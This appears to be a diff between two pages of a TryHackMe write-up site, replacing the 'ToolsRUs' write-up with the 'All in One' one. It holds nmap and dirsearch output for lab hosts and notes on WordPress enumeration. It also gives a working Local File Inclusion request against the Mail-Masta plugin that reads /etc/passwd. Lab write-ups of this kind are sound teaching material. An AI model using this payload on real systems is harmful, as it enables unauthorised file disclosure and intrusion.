@@ -9,17 +9,15 @@
       
       
       
-        <link rel="prev" href="../ARcHanG3l/">
+        <link rel="prev" href="../Tech_Supp0rt/">
       
-      
-        <link rel="next" href="../CVE-2021-29447/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.13">
     
     
       
-        <title>ToolsRUs - THM Writeups | Vasanth Vanan</title>
+        <title>All in One - THM Writeups | Vasanth Vanan</title>
       
     
     
@@ -104,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              ToolsRUs
+              All in One
             
           </span>
         </div>
@@ -373,83 +371,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          ToolsRUs
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../ToolsRUs/" class="md-nav__link">
         ToolsRUs
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#scanning" class="md-nav__link">
-    Scanning
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumerating-apache-coyote-jsp-engine" class="md-nav__link">
-    Enumerating Apache Coyote JSP Engine
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumerating-the-http-server" class="md-nav__link">
-    Enumerating the HTTP Server
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploiting-guidelines-page" class="md-nav__link">
-    Exploiting '/guidelines' page
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploiting-apache-tomcat-with-harvested-credentials" class="md-nav__link">
-    Exploiting Apache Tomcat with Harvested Credentials
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#gaining-root-access" class="md-nav__link">
-    Gaining Root access
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -487,11 +413,89 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../AllInOne/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          All in One
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         All in One
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#scanning" class="md-nav__link">
+    Scanning
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    Initial Access
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-elyana" class="md-nav__link">
+    Gaining User access (Elyana)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-root-access" class="md-nav__link">
+    Gaining Root access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -688,37 +692,43 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#enumerating-apache-coyote-jsp-engine" class="md-nav__link">
-    Enumerating Apache Coyote JSP Engine
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#enumerating-the-http-server" class="md-nav__link">
-    Enumerating the HTTP Server
+  <a href="#initial-access" class="md-nav__link">
+    Initial Access
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#exploiting-guidelines-page" class="md-nav__link">
-    Exploiting '/guidelines' page
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-elyana" class="md-nav__link">
+    Gaining User access (Elyana)
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#exploiting-apache-tomcat-with-harvested-credentials" class="md-nav__link">
-    Exploiting Apache Tomcat with Harvested Credentials
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
+        
+          <li class="md-nav__item">
   <a href="#gaining-root-access" class="md-nav__link">
     Gaining Root access
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -740,14 +750,14 @@
   
 
 
-  <h1>ToolsRUs</h1>
+  <h1>All in One</h1>
 
-<p><a class="md-button" href="https://tryhackme.com/room/toolsrus">TryHackMe Link</a></p>
+<p><a class="md-button" href="https://tryhackme.com/room/allinonemj">TryHackMe Link</a></p>
 <div class="admonition example">
 <p class="admonition-title">Description</p>
 <p><p id="desc" style="font-size:15px"></p></p>
 </div>
-<p>In this section, I will discuss about gaining access to a system by exploiting vulnerabilities in various services. The services include Apache Tomcat, Apache Coyote JSP Engine, Apache Jserv, and an HTTP server on port 80.</p>
+<p>This "All in One" Box has various vulnerabilities that can be exploited in several ways. There is not just one path to root, but many. In this blog, I have provided all the ways, so you can choose whichever you want.</p>
 <h2 id="scanning"><b>Scanning</b><a class="headerlink" href="#scanning" title="Permanent link">&para;</a></h2>
 <ul>
 <li>
@@ -780,11 +790,6 @@
 <td align="center"><p id="p3" style="font-size:14px;  color: purple"></p></td>
 <td align="center"><p id="s3" style="font-size:14px; color: purple"></p></td>
 <td align="center"><p id="d3" style="font-size:14px; color: purple"></p></td>
-</tr>
-<tr>
-<td align="center"><p id="p4" style="font-size:14px;  color: purple"></p></td>
-<td align="center"><p id="s4" style="font-size:14px; color: purple"></p></td>
-<td align="center"><p id="d4" style="font-size:14px; color: purple"></p></td>
 </tr>
 </tbody>
 </table>
@@ -826,32 +831,50 @@
 <span class="normal">34</span>
 <span class="normal">35</span>
 <span class="normal">36</span>
-<span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">  </span><span class="c1"># Nmap 7.93 scan initiated Wed Feb 22 10:11:28 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.4.144</span>
-<span class="w">  </span>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.4.144
-<span class="w">  </span>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.15s<span class="w"> </span>latency<span class="o">)</span>.
-<span class="w">  </span>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">996</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
-<span class="w">  </span>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
-<span class="hll"><span class="w">  </span><span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.2p2<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu2.8<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">  </span><span class="c1"># Nmap 7.93 scan initiated Mon Feb 13 09:48:37 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.245.161</span>
+<span class="w">  </span>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.245.161
+<span class="w">  </span>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.16s<span class="w"> </span>latency<span class="o">)</span>.
+<span class="w">  </span>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">997</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<span class="w">  </span>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="hll"><span class="w">  </span><span class="m">21</span>/tcp<span class="w"> </span>open<span class="w">  </span>ftp<span class="w">     </span>vsftpd<span class="w"> </span><span class="m">3</span>.0.3
+</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>ftp-syst:<span class="w"> </span>
+<span class="w">  </span><span class="p">|</span><span class="w">   </span>STAT:<span class="w"> </span>
+<span class="w">  </span><span class="p">|</span><span class="w"> </span>FTP<span class="w"> </span>server<span class="w"> </span>status:
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>Connected<span class="w"> </span>to<span class="w"> </span>::ffff:10.17.3.217
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>Logged<span class="w"> </span><span class="k">in</span><span class="w"> </span>as<span class="w"> </span>ftp
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>TYPE:<span class="w"> </span>ASCII
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>No<span class="w"> </span>session<span class="w"> </span>bandwidth<span class="w"> </span>limit
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>Session<span class="w"> </span>timeout<span class="w"> </span><span class="k">in</span><span class="w"> </span>seconds<span class="w"> </span>is<span class="w"> </span><span class="m">300</span>
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>Control<span class="w"> </span>connection<span class="w"> </span>is<span class="w"> </span>plain<span class="w"> </span>text
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>Data<span class="w"> </span>connections<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>plain<span class="w"> </span>text
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>At<span class="w"> </span>session<span class="w"> </span>startup,<span class="w"> </span>client<span class="w"> </span>count<span class="w"> </span>was<span class="w"> </span><span class="m">2</span>
+<span class="w">  </span><span class="p">|</span><span class="w">      </span>vsFTPd<span class="w"> </span><span class="m">3</span>.0.3<span class="w"> </span>-<span class="w"> </span>secure,<span class="w"> </span>fast,<span class="w"> </span>stable
+<span class="w">  </span><span class="p">|</span>_End<span class="w"> </span>of<span class="w"> </span>status
+<span class="w">  </span><span class="p">|</span>_ftp-anon:<span class="w"> </span>Anonymous<span class="w"> </span>FTP<span class="w"> </span>login<span class="w"> </span>allowed<span class="w"> </span><span class="o">(</span>FTP<span class="w"> </span>code<span class="w"> </span><span class="m">230</span><span class="o">)</span>
+<span class="hll"><span class="w">  </span><span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
 </span><span class="w">  </span><span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
-<span class="w">  </span><span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span>460e76fbb6a2f7f78536656f8809f7e8<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
-<span class="w">  </span><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>a1bc5d3478f4e8d4091805ef9d9072c5<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="w">  </span><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>0757145539dfc56296f9fc4883cf127e<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
-<span class="hll"><span class="w">  </span><span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.18<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
-</span><span class="w">  </span><span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.18<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="w">  </span><span class="p">|</span>_http-title:<span class="w"> </span>Site<span class="w"> </span>doesn<span class="err">&#39;</span>t<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>title<span class="w"> </span><span class="o">(</span>text/html<span class="o">)</span>.
-<span class="hll"><span class="w">  </span><span class="m">1234</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>Tomcat/Coyote<span class="w"> </span>JSP<span class="w"> </span>engine<span class="w"> </span><span class="m">1</span>.1
-</span><span class="w">  </span><span class="p">|</span>_http-favicon:<span class="w"> </span>Apache<span class="w"> </span>Tomcat
-<span class="w">  </span><span class="p">|</span>_http-title:<span class="w"> </span>Apache<span class="w"> </span>Tomcat/7.0.88
-<span class="w">  </span><span class="p">|</span>_http-server-header:<span class="w"> </span>Apache-Coyote/1.1
-<span class="hll"><span class="w">  </span><span class="m">8009</span>/tcp<span class="w"> </span>open<span class="w">  </span>ajp13<span class="w">   </span>Apache<span class="w"> </span>Jserv<span class="w"> </span><span class="o">(</span>Protocol<span class="w"> </span>v1.3<span class="o">)</span>
-</span><span class="w">  </span><span class="p">|</span>_ajp-methods:<span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>valid<span class="w"> </span>response<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>OPTION<span class="w"> </span>request
+<span class="w">  </span><span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span>e25c3322765c9366cd969c166ab317a4<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="w">  </span><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>1b6a36e18eb4965ec6ef0d91375859b6<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="w">  </span><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>fbfadbea4eed202b91189d58a06a50ec<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="hll"><span class="w">  </span><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+</span><span class="w">  </span><span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="w">  </span><span class="p">|</span>_http-title:<span class="w"> </span>Apache2<span class="w"> </span>Ubuntu<span class="w"> </span>Default<span class="w"> </span>Page:<span class="w"> </span>It<span class="w"> </span>works
 <span class="w">  </span>No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>what<span class="w"> </span>OS<span class="w"> </span>is<span class="w"> </span>running<span class="w"> </span>on<span class="w"> </span>it,<span class="w"> </span>see<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span><span class="o">)</span>.
 <span class="w">  </span>TCP/IP<span class="w"> </span>fingerprint:
-<span class="w">  </span>OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span><span class="m">7</span>.93%E<span class="o">=</span><span class="m">4</span>%D<span class="o">=</span><span class="m">2</span>/22%OT<span class="o">=</span><span class="m">22</span>%CT<span class="o">=</span><span class="m">1</span>%CU<span class="o">=</span><span class="m">33697</span>%PV<span class="o">=</span>Y%DS<span class="o">=</span><span class="m">5</span>%DC<span class="o">=</span>I%G<span class="o">=</span>Y%TM<span class="o">=</span>63F630B
-<span class="w">  </span>OS:F%P<span class="o">=</span>aarch64-unknown-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span><span class="m">105</span>%GCD<span class="o">=</span><span class="m">1</span>%ISR<span class="o">=</span><span class="m">109</span>%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS
-<span class="w">  </span>OS:<span class="o">=</span><span class="m">8</span><span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M505ST11NW7%O2<span class="o">=</span>M505ST11NW7%O3<span class="o">=</span>M505NNT11NW7%O4<span class="o">=</span>M505ST11NW7%O5<span class="o">=</span>M
-<span class="w">  </span>OS:505ST11NW7%O6<span class="o">=</span>M505ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>68DF%W2<span class="o">=</span>68DF%W3<span class="o">=</span>68DF%W4<span class="o">=</span>68DF%W5<span class="o">=</span>68DF%W6<span class="o">=</span><span class="m">68</span>
-<span class="w">  </span>OS:DF<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">6903</span>%O<span class="o">=</span>M505NNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%S<span class="o">=</span>O%A<span class="o">=</span>
+<span class="w">  </span>OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span><span class="m">7</span>.93%E<span class="o">=</span><span class="m">4</span>%D<span class="o">=</span><span class="m">2</span>/13%OT<span class="o">=</span><span class="m">21</span>%CT<span class="o">=</span><span class="m">1</span>%CU<span class="o">=</span><span class="m">35531</span>%PV<span class="o">=</span>Y%DS<span class="o">=</span><span class="m">5</span>%DC<span class="o">=</span>I%G<span class="o">=</span>Y%TM<span class="o">=</span>63EA4DE
+<span class="w">  </span>OS:2%P<span class="o">=</span>aarch64-unknown-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span><span class="m">104</span>%GCD<span class="o">=</span><span class="m">1</span>%ISR<span class="o">=</span><span class="m">108</span>%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS
+<span class="w">  </span>OS:<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M505ST11NW7%O2<span class="o">=</span>M505ST11NW7%O3<span class="o">=</span>M505NNT11NW7%O4<span class="o">=</span>M505ST11NW7%O5<span class="o">=</span>M
+<span class="w">  </span>OS:505ST11NW7%O6<span class="o">=</span>M505ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>F4B3%W2<span class="o">=</span>F4B3%W3<span class="o">=</span>F4B3%W4<span class="o">=</span>F4B3%W5<span class="o">=</span>F4B3%W6<span class="o">=</span>F4
+<span class="w">  </span>OS:B3<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span>F507%O<span class="o">=</span>M505NNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%S<span class="o">=</span>O%A<span class="o">=</span>
 <span class="w">  </span>OS:S+%F<span class="o">=</span>AS%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q
 <span class="w">  </span>OS:<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>A
 <span class="w">  </span>OS:%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
@@ -859,19 +882,42 @@
 <span class="w">  </span>OS:<span class="o">=</span><span class="m">40</span>%CD<span class="o">=</span>S<span class="o">)</span>
 
 <span class="w">  </span>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">5</span><span class="w"> </span>hops
-<span class="w">  </span>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+<span class="w">  </span>Service<span class="w"> </span>Info:<span class="w"> </span>OSs:<span class="w"> </span>Unix,<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
 
 <span class="w">  </span>OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
-<span class="w">  </span><span class="c1"># Nmap done at Wed Feb 22 10:11:59 2023 -- 1 IP address (1 host up) scanned in 30.78 seconds</span>
+<span class="w">  </span><span class="c1"># Nmap done at Mon Feb 13 09:49:06 2023 -- 1 IP address (1 host up) scanned in 29.29 seconds</span>
 </code></pre></div></td></tr></table></div></li>
 </ul>
-<h2 id="enumerating-apache-coyote-jsp-engine"><b>Enumerating Apache Coyote JSP Engine</b><a class="headerlink" href="#enumerating-apache-coyote-jsp-engine" title="Permanent link">&para;</a></h2>
-<p>At first, my plan was to exploit the Apache JSP Engine by uploading a malicious WAR file to obtain a shell. Since I was familiar with this method, I felt confident. However, I was unable to pass the authorization process.</p>
-<p>In my attempts to gain access to the Tomcat Manager, I initially turned to a Python script to brute force default logins for Apache Tomcat. Unfortunately, this approach also failed. </p>
-<h2 id="enumerating-the-http-server"><b>Enumerating the HTTP Server</b><a class="headerlink" href="#enumerating-the-http-server" title="Permanent link">&para;</a></h2>
-<p>I then shifted my focus to the HTTP server running on port 80, where I discovered a simple page that hinted at the development of the site. </p>
+<h2 id="enumeration"><b>Enumeration</b><a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<p>Initially, I enumerated the <strong>FTP</strong> protocol and searched for anything suspicious, but the root directory was empty. Therefore, I moved ahead.</p>
+<p>At port 80, as this is typical in most CTFs, I saw the default Apache welcome page. I continued to enumerate and explore the hidden directories. I discovered <strong>/wordpress</strong> (again, a typical result) and <strong>/hackathons</strong> (although it appeared to be a folder, later I got surprised).</p>
 <p><img id="image1" /></p>
-<p>Utilizing a dirsearch Python script, I was able to locate potentially hidden pages and directories that could provide further clues and entry points.</p>
+<p>I visited both websites and discovered that Wordpress had the following:</p>
+<ul>
+<li>Theme: TwentyTwenty</li>
+<li>XML-RPC enabled</li>
+<li>Vulnerable plugin: Mail-Masta</li>
+<li>Users: Elyana</li>
+</ul>
+<p>Meanwhile, <strong>/hackathons</strong> only provided me with this information. </p>
+<p><img id="image2" /></p>
+<p>While sneaking around the page source, I found some credentials -- <strong><del class="critic">REDACTED</del></strong> which I suspected were <strong><code>username:Base64</code></strong>. However, it failed to decode literally. Then, I asked my friend Cyberchef Magic Function to decode it, but it still didn't help. Nonetheless, I moved on.</p>
+<p>I decided to conduct further research on the vulnerability in Wordpress. </p>
+<ul>
+<li>I found that the <strong><code>TwentyTwenty</code></strong> theme did not have any significant vulnerabilities. 
+  <img id="image3" /></li>
+<li>I attempted different <strong><code>XML-RPC methods</code></strong> to retrieve data but failed. </li>
+<li>Then, I discovered that <strong><code>Mail-Masta</code></strong> had an exploit in the SearchSploit module, which I decided to try.</li>
+</ul>
+<h2 id="initial-access"><b>Initial Access</b><a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
+<p>Mail-Masta was affected by LFI, which was ideal for obtaining the contents of local server files.</p>
+<div class="admonition info">
+<p class="admonition-title">Local File Inclusion (LFI)</p>
+<p><span><strong>LFI</strong> is a web vulnerability that allows attackers to access files on the server they shouldn't have access to. This occurs when a web application includes a file from the server's file system using user input without proper validation.</span></p>
+</div>
+<p>To retrieve <strong><code>/etc/passwd</code></strong>, I used:</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
@@ -896,71 +942,164 @@
 <span class="normal">22</span>
 <span class="normal">23</span>
 <span class="normal">24</span>
-<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">    </span>Target:<span class="w"> </span>http://10.10.4.144/
-
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:13:58<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>297B<span class="w">  </span>-<span class="w"> </span>/.ht_wsr.txt<span class="w">                                     </span>
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>300B<span class="w">  </span>-<span class="w"> </span>/.htaccess.bak1
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>302B<span class="w">  </span>-<span class="w"> </span>/.htaccess.sample
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>300B<span class="w">  </span>-<span class="w"> </span>/.htaccess.orig
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>300B<span class="w">  </span>-<span class="w"> </span>/.htaccess.save
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>301B<span class="w">  </span>-<span class="w"> </span>/.htaccess_extra
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>300B<span class="w">  </span>-<span class="w"> </span>/.htaccess_orig
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>298B<span class="w">  </span>-<span class="w"> </span>/.htaccess_sc
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>298B<span class="w">  </span>-<span class="w"> </span>/.htaccessBAK
-<span class="w">    </span><span class="o">[</span><span class="m">10</span>:14:03<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>298B<span class="w">  </span>-<span class="w"> </span>/.htaccessOLD
